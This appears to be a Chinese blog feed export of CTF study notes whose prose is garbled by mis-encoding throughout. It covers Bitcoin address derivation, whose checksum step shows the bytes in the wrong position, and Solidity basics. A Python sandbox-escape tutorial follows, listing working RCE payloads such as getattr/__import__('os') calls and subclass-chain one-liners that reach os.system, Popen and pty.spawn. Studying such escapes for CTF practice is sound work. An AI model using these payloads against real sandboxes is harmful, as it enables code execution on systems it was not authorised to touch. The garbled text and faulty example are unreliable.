<h2 id="æ¯”ç‰¹å¸çš„äº¤æ˜“åŠ å¯†"><a href="#æ¯”ç‰¹å¸çš„äº¤æ˜“åŠ å¯†" class="headerlink" title="æ¯”ç‰¹å¸çš„äº¤æ˜“åŠ å¯†"></a>æ¯”ç‰¹å¸çš„äº¤æ˜“åŠ å¯†</h2><p>å¯¹äºæ¯ä¸ªç”¨æˆ·çš„é’±åŒ…ï¼Œéƒ½ç”±ä¸‰éƒ¨åˆ†ç»„æˆ</p>
<p><strong>16ä½çš„åœ°å€ï¼Œå…¬é’¥ï¼Œç§é’¥(256ä½)</strong></p>
<p>å‡è®¾åœ¨Aä¸Bäº¤æ˜“ï¼ŒAå‘é€ç»™Bä¸€æ¡Açš„ç§é’¥åŠ å¯†è¿‡çš„å†…å®¹ï¼Œé‚£ä¹ˆè‹¥Bæ²¡æœ‰Açš„å…¬é’¥ï¼ŒBå°±æ— æ³•è§£å¯†å†…å®¹</p>
<p>å…¬é’¥çš„äº§ç”Ÿä¾èµ–äºç§é’¥ï¼Œè€Œé’±åŒ…çš„åœ°å€ç”Ÿæˆä¾èµ–äºå…¬é’¥</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/65e01b2554c3850eeeebb60eb7c4b93b.jpeg" alt="img"></p>
<p>è´´ä¸€æ¡å…¶ä»–å¸ˆå‚…çš„è¯´æ˜è¿‡ç¨‹ã€‚</p>
<p>ç¬¬ä¸€æ­¥ï¼šç”Ÿæˆéšæœºç§é’¥</p>
<p>ç§é’¥æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œéšæœºé€‰å–ä¸€ä¸ª32å­—èŠ‚çš„æ•°ï¼Œè¿™ä¸ªæ•°çš„èŒƒå›´å¤§å°æ˜¯ä»‹äº1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141ä¹‹é—´çš„ä¸€ä¸ªæ•°ï¼Œä¸ºäº†æ–¹ä¾¿åé¢çš„è®¡ç®—ï¼Œæˆ‘ä»¬éšæœºç”Ÿæˆä¸€ä¸ªåˆæ³•çš„ç§é’¥ï¼š</p>
<p>8F72F6B29E6E225A36B68DFE333C7CE5E55D83249D3D2CD6332671FA445C4DD3</p>
<p>ç¬¬äºŒæ­¥ï¼šæ¤­åœ†æ›²çº¿ç®—å…¬é’¥</p>
<p>ç”Ÿæˆäº†ç§é’¥ä¹‹åï¼Œæˆ‘ä»¬ä½¿ç”¨æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼ˆECDSA-secp256k1ï¼‰è®¡ç®—ç§é’¥æ‰€å¯¹åº”çš„éå‹ç¼©å…¬é’¥ï¼Œç”Ÿæˆçš„å…¬é’¥å…±65å­—èŠ‚ï¼Œ å…¶ä¸­ä¸€ä¸ªå­—èŠ‚æ˜¯0x04ï¼Œå…¶ä¸­32ä¸ªå­—èŠ‚æ˜¯Xåæ ‡ï¼Œå¦å¤–32ä¸ªå­—èŠ‚æ˜¯Yåæ ‡ï¼š</p>
<p>å…¬é’¥P.Xï¼š<br>06CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385</p>
<p>å…¬é’¥P.Yï¼š<br>FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>ç¬¬ä¸‰æ­¥ï¼šè®¡ç®—å…¬é’¥çš„SHA-256å“ˆå¸Œå€¼</p>
<p>å°†ä¸Šè¿°å…¬é’¥åœ°å€æ‹¼åˆï¼Œå¾—åˆ°æ ‡å‡†åœ°å€ï¼š<br>0406CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>å¯¹é½è¿›è¡ŒSHA-256å“ˆå¸Œè®¡ç®—ï¼Œå¾—åˆ°ç»“æœï¼š<br>2572e5f4a8e77ddf5bb35b9e61c61f66455a4a24bcfd6cb190a8e8ff48fc097d</p>
<p>ç¬¬å››æ­¥ï¼šè®¡ç®— RIPEMD-160å“ˆå¸Œå€¼</p>
<p>å–ä¸Šä¸€æ­¥ç»“æœï¼Œè¿›è¡ŒRIPEMD-160è®¡ç®—ï¼Œå¾—åˆ°ç»“æœï¼š</p>
<p>0b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>ç¬¬äº”æ­¥ï¼šåŠ å…¥åœ°å€ç‰ˆæœ¬å·ï¼ˆæ¯”ç‰¹å¸ä¸»ç½‘ç‰ˆæœ¬å·â€œ0x00â€ï¼‰</p>
<p>å–ä¸Šä¸€æ­¥ç»“æœï¼Œåœ¨å‰é¢åŠ ä¸Š16è¿›åˆ¶çš„00ï¼Œå³ï¼š</p>
<p>000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>ç¬¬å…­æ­¥ï¼šè®¡ç®— SHA-256 å“ˆå¸Œå€¼</p>
<p>å–ä¸Šä¸€æ­¥ç»“æœï¼Œè¿›è¡ŒSHA-256è®¡ç®—ï¼Œå¯å¾—ï¼š</p>
<p>ddc2270f93cc84cc6869dd373f3c340bbf5cb9a8f5559297cc9e5d947aab2536</p>
<p>ç„¶åï¼Œå¯¹ä»¥ä¸Šç»“æœå†æ¬¡è®¡ç®— SHA-256 å“ˆå¸Œå€¼ï¼Œå¾—åˆ°ï¼š</p>
<p>869ac57b83ccf75ca9da8895823562fffb611e3c297d9c2d4612aeeb32850078</p>
<p>ç¬¬ä¸ƒæ­¥ï¼šå–ä¸Šä¸€æ­¥ç»“æœçš„å‰4ä¸ªå­—èŠ‚ï¼ˆ8ä½åå…­è¿›åˆ¶ï¼‰</p>
<p>869ac57b</p>
<p>ç¬¬å…«æ­¥ï¼šæŠŠè¿™4ä¸ªå­—èŠ‚åŠ åœ¨ç¬¬äº”æ­¥çš„ç»“æœåé¢</p>
<p>ä½œä¸ºæ ¡éªŒä½ï¼Œå°†è¿™4ä¸ªå­—èŠ‚åŠ è½½ç¬¬äº”æ­¥çš„ç»“æœåé¢ï¼Œè¿™å°±æ˜¯æ¯”ç‰¹å¸åœ°å€çš„16è¿›åˆ¶å½¢æ€äº†ï¼š</p>
<p>869ac57b000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>ç¬¬ä¹æ­¥ï¼šç”¨Base58ç¼–ç å˜æ¢ä¸€ä¸‹åœ°å€</p>
<p>å¯¹ä¸Šä¸€æ­¥çš„ç»“æœè¿›è¡ŒBase58ç¼–ç ï¼Œå¾—åˆ°ï¼š</p>
<p>1QCXRuoxWo5Bya9NxHaVBArBQYhatHJrU7</p>
<p>è¿™å°±æ˜¯æˆ‘ä»¬ç»å¸¸çœ‹åˆ°çš„ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„æ¯”ç‰¹å¸é’±åŒ…åœ°å€</p>
<h1 id="æ™ºèƒ½åˆçº¦å¼€å‘"><a href="#æ™ºèƒ½åˆçº¦å¼€å‘" class="headerlink" title="æ™ºèƒ½åˆçº¦å¼€å‘"></a>æ™ºèƒ½åˆçº¦å¼€å‘</h1><p>æ™ºèƒ½åˆçº¦çš„å¼€å‘ï¼Œä¸»è¦ä½¿ç”¨Solidityç¼–è¯‘è¯­è¨€ä»¥åŠåœ¨çº¿çš„Remixç¼–è¯‘å™¨</p>
<h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><h3 id="æ•´æ•°"><a href="#æ•´æ•°" class="headerlink" title="æ•´æ•°"></a>æ•´æ•°</h3><p>æœ‰ç¬¦å·æ•´æ•°ç±»å‹åŒ…æ‹¬int8ã€int16ã€int32ã€int64ç­‰ï¼Œè€Œæ— ç¬¦å·æ•´æ•°ç±»å‹åŒ…æ‹¬uint8ã€uint16ã€uint32ã€uint64ç­‰ã€‚è¿™äº›ç±»å‹è¡¨ç¤ºä¸åŒä½æ•°çš„æ•´æ•°ã€‚</p>
<p>ç›¸è¾ƒäºCè¯­è¨€ï¼Œä¿ç•™äº†å¤§éƒ¨åˆ†è¿ç®—ï¼Œå¢åŠ äº†ä¹˜æ–¹(**)è¿ç®—ä»¥åŠæ›´æ”¹äº†â€&lt;&lt;â€â€&gt;&gt;â€çš„è¿ç®—è§„åˆ™</p>
<pre><code class="highlight plaintext">x&lt;&lt;y  ç›¸å½“äºx*2**y   x&gt;&gt;yç›¸å½“äºx/2**y</code></pre>



<h3 id="é€»è¾‘"><a href="#é€»è¾‘" class="headerlink" title="é€»è¾‘"></a>é€»è¾‘</h3><p>å³boolç±»å‹ï¼Œä¼šåœ¨å†…ç½®å‡½æ•°ä¸­å¤§é‡å‡ºç°ï¼Œé»˜è®¤å€¼ä¸ºfalse</p>
<h3 id="åœ°å€"><a href="#åœ°å€" class="headerlink" title="åœ°å€"></a>åœ°å€</h3><p>ç”¨<strong>address</strong>æ¥å£°æ˜ï¼Œé•¿åº¦ä¸º20ä½ï¼Œè¡¨ç¤ºä»¥å¤ªåŠç½‘ç»œä¸Šçš„è´¦æˆ·åœ°å€</p>
<p>åœ¨åœ°å€å‹ä¸‹æœ‰**transfer(è½¬è´¦)<strong>ä¸</strong>balance(è´¦æˆ·)**ä¸¤ä¸ªå˜é‡</p>
<p>é€šè¿‡ä»¥ä¸‹å‡½æ•°æ¥å¤„ç†åœ°å€ç±»å‹ï¼ˆå…³äºGasçš„æ¦‚å¿µï¼Œè¯·è§<strong>äº¤æ˜“å¤„ç†</strong>æ¿å—ï¼‰</p>
<pre><code class="highlight plaintext">&lt;address&gt;.balance(uint 256) â€”â€”&gt;è¿”å›ä»¥weiä¸ºå•ä½çš„è¯¥åœ°å€çš„ä»¥å¤ªå¸è´¦æˆ·ï¼ˆ1ETH=10^18weiï¼‰</code></pre>

<pre><code class="highlight plaintext">&lt;address&gt;.transfer(uint 256 amount) â€”â€”&gt; ç»™æŸåœ°å€è½¬å…¥æŒ‡å®šæ•°é‡çš„ä»¥å¤ªå¸ï¼ˆæ¯æ¬¡è½¬è´¦éœ€è¦2300çš„Gasè´¹ç”¨ï¼Œä¸”è´¹ç”¨å›ºå®šï¼‰</code></pre>

<p>ä½™é¢ä¸è¶³ï¼ŒGasä¸è¶³æ—¶ä¼šä½¿åˆçº¦æ— æ³•æ‰§è¡Œï¼Œå›æ»šå·²æ‰§è¡Œçš„ç¨‹åºå¹¶ä¸”å‘é€å¼‚å¸¸ä¿¡æ¯ï¼ˆ<strong>äº¤æ˜“è¢«ç»ˆæ­¢</strong>ï¼‰</p>
<pre><code class="highlight plaintext">&lt;address&gt;.send(uint 256 amount) returns (bool) â€”â€”&gt; ç»™æŸåœ°å€è½¬å…¥æŒ‡å®šæ•°é‡çš„ä»¥å¤ªå¸ï¼ˆæ¯æ¬¡è½¬è´¦éœ€è¦2300çš„Gasè´¹ç”¨ï¼Œä¸”è´¹ç”¨å›ºå®šï¼‰åœ¨äº¤æ˜“æˆåŠŸæˆ–å¤±è´¥åä¼šè¿”å›å¯¹åº”çš„boolå€¼</code></pre>

<p>ä½™é¢ä¸è¶³ï¼ŒGasä¸è¶³æ—¶ä¼šç»ˆæ­¢ç¨‹åºä½†ä¸ä¼šå‘é€å¼‚å¸¸æ¶ˆæ¯ï¼Œä¼šè¿”å›False</p>
<p>ä½†ä½¿ç”¨.sendæ˜¯å­˜åœ¨ä¸€å®šé£é™©çš„ï¼Œå¯èƒ½ä¼šå¯¼è‡´è½¬è´¦å¤±è´¥(è°ƒç”¨çš„å †æ ˆ&gt;1024KBæˆ–å‘å‡ºæ–¹çš„Gasè€—å°½)çš„æƒ…å†µä¸‹äº¤æ˜“çš„å¯¹æ–¹ä»èƒ½æ”¶åˆ°ä»¥å¤ªå¸</p>
<pre><code class="highlight plaintext">&lt;address&gt;.call(...) returns (bool) â€”â€”&gt;æœ€å¸¸ç”¨çš„è°ƒç”¨å‡½æ•°ï¼Œå¤±è´¥è¿”å›false,Gasçš„è´¹ç”¨å¯è‡ªå·±è°ƒæ•´ã€‚</code></pre>

<p>å‘å¸ƒä½çº§åˆ«çš„è°ƒç”¨</p>
<p>call()ä¸‹æœ‰ä¸¤ä¸ªæ§åˆ¶äº¤æ˜“çš„å†…ç½®å‡½æ•°</p>
<p>gas()(æ”¯ä»˜çš„Gaså€¼)ä¸value()(æ”¯ä»˜çš„ä»¥å¤ªå¸å€¼)ï¼Œä¸¤è€…åŒæ—¶è°ƒç”¨æ²¡æœ‰å…ˆåé¡ºåºçš„è¦æ±‚</p>
<pre><code class="highlight plaintext">ä¾‹å¦‚ï¼šaddress.call.gas(100000).value(1 ether)(&quot;register&quot;,&quot;Myname&quot;)</code></pre>



<pre><code class="highlight plaintext">&lt;address&gt;.callcode(...) returns (bool)</code></pre>

<p>å‘å¸ƒä½çº§åˆ«çš„è°ƒç”¨ï¼Œæ²¡callå¥½ç”¨ï¼Œä¸ä¹…å°±ä¼šè¢«åˆ é™¤äº†</p>
<pre><code class="highlight plaintext">&lt;address&gt; .delegatecall(...) returns (bool)</code></pre>

<p>å‘å¸ƒä½çº§åˆ«çš„ä»£è¡¨è°ƒç”¨,è°ƒç”¨çš„æ˜¯å‚¨å­˜åœ¨å¦ä¸€ä¸ªåº“ä¸­çš„åº“ä»£ç (Library code)</p>
<p>ï¼Ÿæ•…ä½¿ç”¨å‰è¦ç¡®å®šä¸¤ä¸ªåˆçº¦çš„å‚¨å­˜è®¾è®¡éƒ½è¦é€‚ç”¨äºè¯¥å‡½æ•°ï¼Ÿ</p>
<blockquote>
<p>[!WARNING]</p>
<p><code>call()</code> <code>callcode()</code> <code>delegatecall()</code>éƒ½æ˜¯ä½é˜¶å‡½æ•°ï¼Œä½¿ç”¨æ—¶è°ƒç”¨çš„æœªçŸ¥åˆçº¦å¯èƒ½æ˜¯æ¶æ„åˆçº¦ï¼Œåœ¨è°ƒç”¨æ˜¯å¯èƒ½ä¼šè¢«ç¯¡æƒï¼Œåè¿‡æ¥è¢«è°ƒç”¨åˆçº¦ï¼Œå› æ­¤è°ƒç”¨å‡½æ•°è¿”å›æ—¶è¦æ³¨æ„åŸåˆçº¦çš„å‚æ•°æ˜¯å¦å·²ç»è¢«æ”¹å˜</p>
</blockquote>
<blockquote>
<p>åœ°å€å¸¸é‡</p>
</blockquote>
<p>â€‹	</p>
<h3 id="å­—èŠ‚æ•°ç»„"><a href="#å­—èŠ‚æ•°ç»„" class="headerlink" title="å­—èŠ‚æ•°ç»„"></a>å­—èŠ‚æ•°ç»„</h3><p>åˆ†ä¸º<strong>å›ºå®šé•¿åº¦çš„å­—èŠ‚æ•°ç»„</strong>ä»¥åŠ<strong>å¯å˜é•¿åº¦çš„å­—èŠ‚æ•°ç»„</strong></p>
<p>å›ºå®šé•¿åº¦çš„æ•°ç»„å¯ä»¥ç”¨bytes1~bytes32æ¥è¯´æ˜(bytes1ä¹Ÿå¯ä»¥ç›´æ¥è®°ä½œbyte)</p>
<p>å¯ä»¥é€šè¿‡ç´¢å¼•è®¿é—®ä»¥åŠ[å˜é‡å].lengthè¿”å›å­—èŠ‚é•¿åº¦</p>
<p>å¯å˜é•¿åº¦çš„æ•°ç»„ï¼š</p>
<p>â‘ bytes(ä¸arrayæ€§è´¨ç›¸åŒ)</p>
<p>â‘¡string(å¯ä»¥ç†è§£ä¸ºç‰¹æ®Šçš„æ•°ç»„)ï¼Œä¸å¯ä»¥è°ƒç”¨.length&#x2F;ç´¢å¼•æ¥è®¿é—®</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>æ™ºèƒ½åˆçº¦</tag>
      </tags>
  </entry>
  <entry>
    <title>æ²™ç®±é€ƒé€¸</title>
    <url>/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>æµ…æµ…è®°ä¸€ä¸‹æ— å¤„ä¸åœ¨çš„æ²™ç®±é€ƒé€¸</p>
<p>è¿™ä¸ªä¸œè¥¿è¿˜æ˜¯è¦æ­é…ä¾‹é¢˜çš„å—¯å—¯</p>
<h1 id="æ²™ç®±é€ƒé€¸ä»å…¥é—¨åˆ°æ”¾å¼ƒ"><a href="#æ²™ç®±é€ƒé€¸ä»å…¥é—¨åˆ°æ”¾å¼ƒ" class="headerlink" title="æ²™ç®±é€ƒé€¸ä»å…¥é—¨åˆ°æ”¾å¼ƒ"></a>æ²™ç®±é€ƒé€¸ä»å…¥é—¨åˆ°æ”¾å¼ƒ</h1><h2 id="Pyjail"><a href="#Pyjail" class="headerlink" title="Pyjail"></a><code>Pyjail</code></h2><p><code>misc</code>æ‰‹ä¹Ÿèƒ½å­¦ä¼š<del>å¿…é¡»å­¦ä¼š</del>çš„å°æŠ€å·§</p>
<p>å…ˆä»‹ç»ä¸€äº›ä¸å¤ªå¸¸è§„çš„å†ä»‹ç»å¸¸è§„çš„å§(å¯†ç çš„ç°åœ¨æ²™ç®±å“ªé‡Œè¿˜æœ‰å¸¸è§„çš„ã€‚ã€‚ã€‚)</p>
<p>å…ˆçœ‹ä¸€äº›è¿›è¡Œä¿¡æ¯æ”¶é›†çš„å‡½æ•°ï¼Œä¿¡æ¯æ”¶é›†å®Œæˆåæ‰å¥½ç¡®å®šé€ƒé€¸æ–¹å‘</p>
<h3 id="ç¥å¿…å°å¸®æ‰‹"><a href="#ç¥å¿…å°å¸®æ‰‹" class="headerlink" title="ç¥å¿…å°å¸®æ‰‹"></a>ç¥å¿…å°å¸®æ‰‹</h3><h4 id="dir"><a href="#dir" class="headerlink" title="dir()"></a>dir()</h4><pre><code class="highlight plaintext">dir()å¯ä»¥ç”¨äºæŸ¥çœ‹å¯ç”¨çš„å†…ç½®å‡½æ•°</code></pre>

<p>ä¸»è¦æ˜¯ç”¨æ¥æ‰¾ä½œä¸ºåˆ©ç”¨ç‚¹çš„å‡½æ•°</p>
<h4 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h4><p>ä¸€é”®æŸ¥å±æ€§</p>
<p><code>m.x</code>ç­‰åŒäº<code>m.__dict__[â€œxâ€]</code>,æˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸€äº›ç¼–ç æ¥ç»•è¿‡å­—ç¬¦æ˜æ–‡æ£€<code>m.x</code>ç­‰åŒäº<code>m.__dict__[â€œxâ€]</code>,æˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸€äº›ç¼–ç æ¥ç»•è¿‡å­—ç¬¦æ˜æ–‡æ£€æµ‹</p>
<h4 id="getattr"><a href="#getattr" class="headerlink" title="getattr()"></a><code>getattr()</code></h4><p>çœ‹çœ‹ä½ çš„å±æ€§å‘¢ï¼Œå¯ä»¥å¼•å…¥æ¨¡å—æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæœ‰ç§opcodeçš„å³è§†æ„Ÿ(é›¾)</p>
<pre><code class="highlight plaintext">getattr(__import__(&#x27;os&#x27;),&quot;system&quot;)(&#x27;whoami&#x27;)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703102411030.png" alt="image-20250703102411030"></p>
<h4 id="getattribute"><a href="#getattribute" class="headerlink" title="__getattribute__"></a><code>__getattribute__</code></h4><p>å¯¹è±¡çš„å†…ç½®æ–¹æ³•ï¼Œç”¨äºåœ¨è®¿é—®å¯¹è±¡çš„ä»»æ„å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨</p>
<p>è¿™æ˜¯ä¸€ä¸ªä½çº§åˆ«çš„é’©å­ï¼Œç”¨äºæ‹¦æˆªå±æ€§è®¿é—®ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œ<code>é‡è½½</code>ä»¥<code>è‡ªå®šä¹‰å±æ€§è®¿é—®è¡Œä¸º</code>ã€‚</p>
<pre><code class="highlight plaintext">åœ¨è°ƒç”¨æ—¶ï¼Œä¸€èˆ¬éƒ½æ˜¯__getattibute__å…ˆè¢«è°ƒç”¨ï¼Œå½“æŠ›å‡ºAttributeError å¼‚å¸¸æ—¶ï¼Œ__getattr__ æ‰ä¼šè¢«è°ƒç”¨ã€‚
å¦å¤–ï¼Œæ‰€æœ‰çš„ç±»éƒ½ä¼šæœ‰__getattribute__å±æ€§ï¼Œè€Œä¸ä¸€å®šæœ‰__getattr__å±æ€§</code></pre>



<h4 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__"></a><code>__getitem__</code></h4><p><code>__getitem__</code>æ–¹æ³•é€‚ç”¨äºè·å–å…ƒç´ </p>
<p>å½“ä½¿ç”¨<code>obj[key]</code>è¿™æ ·çš„æ“ä½œæ—¶ï¼Œpythonå°±ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒ</p>
<p>è¿™é‡Œçš„keyå¯ä»¥æ˜¯æ•´æ•°ç´¢å¼•ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–èƒ½å½“â€æ ‡ç­¾â€çš„é”®</p>
<p>è€Œä½ å¯ä»¥ç”¨getæ–¹æ³•æ¥è·å¾—é”®çš„å€¼</p>
<h4 id="â€œç ´å£â€å‡½æ•°"><a href="#â€œç ´å£â€å‡½æ•°" class="headerlink" title="â€œç ´å£â€å‡½æ•°"></a>â€œç ´å£â€å‡½æ•°</h4><pre><code class="highlight plaintext">eval(input())
help()
breakpoint()
sh</code></pre>



<h3 id="å¦™æ‰‹å›æ˜¥-self-builtins"><a href="#å¦™æ‰‹å›æ˜¥-self-builtins" class="headerlink" title="å¦™æ‰‹å›æ˜¥(self builtins)"></a>å¦™æ‰‹å›æ˜¥(self builtins)</h3><p>æœ‰æ—¶æ²™ç®±ä¸­ä¼šç”¨<code>exec</code>é™åˆ¶ä½ çš„å‘½åç©ºé—´</p>
<p>å› ä¸º<code>exec</code>çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ï¼Œé€šè¿‡ä¿®æ”¹ï¼Œåˆ é™¤å‘½åç©ºé—´é‡Œçš„å‡½æ•°å°±è¾¾åˆ°äº†é™åˆ¶ä½ æ“ä½œçš„æ•ˆæœï¼Œä¾‹å­æ¥æºäº iscc_2016_pycalc</p>
<pre><code class="highlight plaintext">def _hook_import_(name, *args, **kwargs):
    module_blacklist = [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;time&#x27;, &#x27;bdb&#x27;, &#x27;bsddb&#x27;, &#x27;cgi&#x27;,
                        &#x27;CGIHTTPServer&#x27;, &#x27;cgitb&#x27;, &#x27;compileall&#x27;, &#x27;ctypes&#x27;, &#x27;dircache&#x27;,
                        &#x27;doctest&#x27;, &#x27;dumbdbm&#x27;, &#x27;filecmp&#x27;, &#x27;fileinput&#x27;, &#x27;ftplib&#x27;, &#x27;gzip&#x27;,
                        &#x27;getopt&#x27;, &#x27;getpass&#x27;, &#x27;gettext&#x27;, &#x27;httplib&#x27;, &#x27;importlib&#x27;, &#x27;imputil&#x27;,
                        &#x27;linecache&#x27;, &#x27;macpath&#x27;, &#x27;mailbox&#x27;, &#x27;mailcap&#x27;, &#x27;mhlib&#x27;, &#x27;mimetools&#x27;,
                        &#x27;mimetypes&#x27;, &#x27;modulefinder&#x27;, &#x27;multiprocessing&#x27;, &#x27;netrc&#x27;, &#x27;new&#x27;,
                        &#x27;optparse&#x27;, &#x27;pdb&#x27;, &#x27;pipes&#x27;, &#x27;pkgutil&#x27;, &#x27;platform&#x27;, &#x27;popen2&#x27;, &#x27;poplib&#x27;,
                        &#x27;posix&#x27;, &#x27;posixfile&#x27;, &#x27;profile&#x27;, &#x27;pstats&#x27;, &#x27;pty&#x27;, &#x27;py_compile&#x27;,
                        &#x27;pyclbr&#x27;, &#x27;pydoc&#x27;, &#x27;rexec&#x27;, &#x27;runpy&#x27;, &#x27;shlex&#x27;, &#x27;shutil&#x27;, &#x27;SimpleHTTPServer&#x27;,
                        &#x27;SimpleXMLRPCServer&#x27;, &#x27;site&#x27;, &#x27;smtpd&#x27;, &#x27;socket&#x27;, &#x27;SocketServer&#x27;,
                        &#x27;subprocess&#x27;, &#x27;sysconfig&#x27;, &#x27;tabnanny&#x27;, &#x27;tarfile&#x27;, &#x27;telnetlib&#x27;,
                        &#x27;tempfile&#x27;, &#x27;Tix&#x27;, &#x27;trace&#x27;, &#x27;turtle&#x27;, &#x27;urllib&#x27;, &#x27;urllib2&#x27;,
                        &#x27;user&#x27;, &#x27;uu&#x27;, &#x27;webbrowser&#x27;, &#x27;whichdb&#x27;, &#x27;zipfile&#x27;, &#x27;zipimport&#x27;]
    for forbid in module_blacklist:
        if name == forbid:        # don&#x27;t let user import these modules
            raise RuntimeError(&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;.format(forbid))
    # normal modules can be imported
    return __import__(name, *args, **kwargs)

def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__[&#x27;__import__&#x27;] = _hook_import_    # hook import
    del __sandboxed_builtins__[&#x27;open&#x27;]
    _global = &#123;
        &#x27;__builtins__&#x27;: __sandboxed_builtins__
    &#125;

    ...
        exec command in _global     # do calculate in a sandboxed  
    ...</code></pre>

<ol>
<li>æ²™ç®±é¦–å…ˆè·å– <code>__builtins__</code>ï¼Œç„¶åä¾æ®ç°æœ‰çš„ <code>__builtins__</code> æ¥æ„å»ºå‘½åç©ºé—´ã€‚</li>
<li>ä¿®æ”¹ <code>__import__</code> å‡½æ•°ä¸ºè‡ªå®šä¹‰çš„<code>_hook_import_</code></li>
<li>åˆ é™¤ open å‡½æ•°é˜²æ­¢æ–‡ä»¶æ“ä½œ</li>
<li>exec å‘½ä»¤ã€‚</li>
</ol>
<p>ç»•è¿‡æ–¹å¼ï¼š</p>
<p>ç”±äº exec è¿è¡Œåœ¨ç‰¹å®šçš„å‘½åç©ºé—´é‡Œï¼Œå¯ä»¥é€šè¿‡è·å–å…¶ä»–å‘½åç©ºé—´é‡Œçš„ <code>__builtins__</code>ï¼ˆè¿™ä¸ª<code>__builtins__</code>ä¿å­˜çš„å°±æ˜¯åŸå§‹<code>__builtins__</code>çš„å¼•ç”¨ï¼‰ï¼Œæ¯”å¦‚ types åº“ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p>
<pre><code class="highlight plaintext">__import__(&#x27;types&#x27;).__builtins__
__import__(&#x27;string&#x27;).__builtins__</code></pre>

<h3 id="ç»§æ‰¿é“¾-no-builtins"><a href="#ç»§æ‰¿é“¾-no-builtins" class="headerlink" title="ç»§æ‰¿é“¾(no builtins)"></a>ç»§æ‰¿é“¾(no builtins)</h3><p>ä»€ä¹ˆ?<code>builtins</code>è¢«æ¸…å…‰äº†?æ²¡äº‹æˆ‘æœ‰ç»§æ‰¿é“¾</p>
<p>pocåŸç†å’ŒSSTIç›¸ä¼¼ï¼Œå°±æ˜¯åˆ©ç”¨çˆ¶ç±»å’Œå­ç±»ä¹‹é—´çš„ç»§æ‰¿å…³ç³»ï¼Œä¸æ–­è®¿é—®å†…éƒ¨å±æ€§æ¥è¾¾åˆ°è°ƒç”¨ï¼Œå®ç°æ–‡ä»¶è¯»å–æˆ–è€…RCEçš„æ•ˆæœ</p>
<p><strong>å‰ææ˜¯æ²¡æœ‰æŠŠattributeç»™ä½ ç¦æ‰ï¼Œç¦æ‰ä¹‹åè¿™ç§æ–¹æ³•å°±è¡Œä¸é€šäº†</strong></p>
<p>æ²¡ç¦æ‰çš„æƒ…å†µåŸºæœ¬æ— æ•Œå§å¤§æ¦‚</p>
<p><strong>RCE</strong></p>
<pre><code class="highlight plaintext"># os
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)

# subprocess 
[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;Popen&#x27;][0](&#x27;ls&#x27;)

# builtins
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]

# help
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#x27;help&#x27;]

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#x27;__builtins__&#x27;]

#sys
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

#commands (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)

#pty (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)

#importlib
